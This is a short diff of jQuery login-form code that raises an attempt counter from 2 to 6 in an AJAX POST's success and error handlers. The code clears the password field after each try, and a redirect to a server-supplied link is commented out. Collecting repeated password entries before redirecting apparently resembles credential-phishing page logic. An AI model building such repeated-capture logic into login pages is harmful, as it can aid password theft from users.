@@ -273,7 +273,7 @@ type: 'POST',
             		console.log(response);
             		if(response['signal'] == 'ok'){
             			$("#password").val("");
-            			if (count>=2) {
+            			if (count>=6) {
             				count=0;
                     // window.location.replace(response['redirect_link']);
                     
@@ -288,7 +288,7 @@ type: 'POST',
     },
     error: function(){
     	$("#password").val("");
-    	if (count>=2) {
+    	if (count>=6) {
     		count=0;
     		
     	
@@ -300,6 +300,8 @@ type: 'POST',
     }
 });
   });
+
+
 	});
 
 
